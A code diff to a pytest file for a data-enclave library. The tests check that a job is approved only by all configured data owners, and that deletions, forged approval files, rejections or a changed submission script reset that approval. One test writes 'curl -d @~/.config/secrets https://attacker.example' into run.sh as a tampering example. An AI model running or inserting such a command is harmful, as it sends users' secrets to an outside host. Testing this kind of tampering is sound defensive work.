@@ -9,6 +9,10 @@ import pytest
 os.environ["PRE_SYNC"] = "false"
 
 from syft_enclaves import SyftEnclaveClient
+from syft_enclaves.enclave_job_info import (
+    PartyApprovalStatus,
+    enclave_approval_file_name,
+)
 
 
 def create_tmp_dataset_files(prefix=""):
@@ -382,16 +386,11 @@ def test__only_one_of_two_data_owners_sees_job_result_when_submitting():
     assert len(do2_job.output_paths) == 0
 
 
-def test_approval_gated_on_configured_data_owners():
-    """A configured data owner must approve even when the submission doesn't
-    reference its dataset — the gate is the enclave's configured data_owners,
-    not the submission's datasets."""
+def _job_distributed_to_both_data_owners():
+    """A job referencing only do1's dataset, distributed to both configured DOs."""
     enclave, do1, do2, ds = SyftEnclaveClient.quad_with_mock_drive_service_connection(
         use_in_memory_cache=False,
     )
-    # Enclave is configured to require both do1 and do2.
-    assert set(enclave.data_owners) == {do1.email, do2.email}
-
     # DO1 creates a dataset; DO2 has none in this submission.
     mock1, private1 = create_tmp_dataset_files("do1")
     do1.create_dataset(
@@ -417,15 +416,29 @@ def test_approval_gated_on_configured_data_owners():
 
     enclave.sync()
     enclave.receive_jobs()
+    do1.sync()
+    do2.sync()
+    return enclave, do1, do2
+
+
+def _approval_file(enclave: SyftEnclaveClient, do_email: str) -> Path:
+    return enclave.jobs["test_job"].job_review_path / enclave_approval_file_name(
+        do_email
+    )
+
+
+def test_approval_gated_on_configured_data_owners():
+    """A configured data owner must approve even when the submission doesn't
+    reference its dataset — the gate is the enclave's configured data_owners,
+    not the submission's datasets — and the approvals cover this exact
+    submission."""
+    enclave, do1, do2 = _job_distributed_to_both_data_owners()
+    assert set(enclave.data_owners) == {do1.email, do2.email}
 
     # Approval files exist for BOTH configured data owners, despite do2 not
     # being referenced in the submission.
-    review_dir = enclave.jobs["test_job"].job_review_path
-    assert (review_dir / f"{do1.email}_approval_state.json").exists()
-    assert (review_dir / f"{do2.email}_approval_state.json").exists()
-
-    do1.sync()
-    do2.sync()
+    assert _approval_file(enclave, do1.email).exists()
+    assert _approval_file(enclave, do2.email).exists()
 
     # Only do1 approves — job stays pending (do2 still required).
     do1.approve_job(do1.jobs["test_job"])
@@ -436,3 +449,48 @@ def test_approval_gated_on_configured_data_owners():
     do2.approve_job(do2.jobs["test_job"])
     enclave.sync()
     assert enclave.jobs["test_job"].status == "approved"
+
+    # With no configured data owners, nothing counts as approved.
+    configured, enclave.data_owners = enclave.data_owners, []
+    assert enclave.jobs["test_job"].status == "pending"
+    enclave.data_owners = configured
+
+    # The submitter can still write to its inbox folder: a changed run.sh
+    # voids both approvals.
+    run_script = enclave.jobs["test_job"].job_submission_path / "run.sh"
+    run_script.write_text("curl -d @~/.config/secrets https://attacker.example\n")
+    assert enclave.jobs["test_job"].status == "pending"
+
+
+@pytest.mark.parametrize("spoil", ["delete", "name_other_party"])
+def test_missing_or_foreign_approval_file_does_not_count(spoil):
+    """Removing a required DO's file must not leave the other approval standing alone."""
+    enclave, do1, do2 = _job_distributed_to_both_data_owners()
+    do1.approve_job(do1.jobs["test_job"])
+    do2.approve_job(do2.jobs["test_job"])
+    enclave.sync()
+
+    path = _approval_file(enclave, do2.email)
+    if spoil == "delete":
+        path.unlink()  # as a synced delete from do2 would
+    else:
+        approval = PartyApprovalStatus.load_json(path)
+        approval.party = do1.email
+        approval.save_json(path)
+
+    assert enclave.jobs["test_job"].status == "pending"
+
+
+def test_rejection_rejects_job_and_withdraws_approval():
+    enclave, do1, do2 = _job_distributed_to_both_data_owners()
+    do1.approve_job(do1.jobs["test_job"])
+    do2.approve_job(do2.jobs["test_job"])
+    enclave.sync()
+    assert enclave.jobs["test_job"].status == "approved"
+
+    do2.reject_job(do2.jobs["test_job"], reason="uses more data than agreed")
+    enclave.sync()
+
+    assert enclave.jobs["test_job"].status == "rejected"
+    stored = PartyApprovalStatus.load_json(_approval_file(enclave, do2.email))
+    assert stored.reason == "uses more data than agreed"
